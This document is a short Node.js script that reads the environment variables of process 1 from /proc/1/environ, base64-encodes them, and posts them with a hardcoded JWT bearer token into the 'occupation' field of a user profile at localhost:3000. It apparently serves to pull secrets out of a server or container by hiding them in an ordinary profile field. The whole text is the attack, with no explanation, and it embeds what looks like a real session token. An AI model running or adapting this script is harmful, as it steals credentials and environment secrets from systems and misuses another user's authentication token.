const fs = require('fs');
const token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5MzIwMjc3MiwiZXhwIjoxNzkzMzc1NTcyLCJuYmYiOjE3OTMyMDI3NzIsImp0aSI6IjcxTUZzUjdsRnZMMFNscUsiLCJzdWIiOiIxMDEzMjY1MyIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.sH9smHlVZwf1txY71UzrTQ_Gpj4VQiBQZs7qPud62yo';
const data = fs.readFileSync('/proc/1/environ').toString('base64');
fetch('http://localhost:3000/api/user/profile', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + token,
    'Cookie': 'bearer=' + token
  },
  body: JSON.stringify({ occupation: data })
}).then(async r => {
  console.log(r.status);
  console.log(await r.text());
}).catch(e => console.error(e));
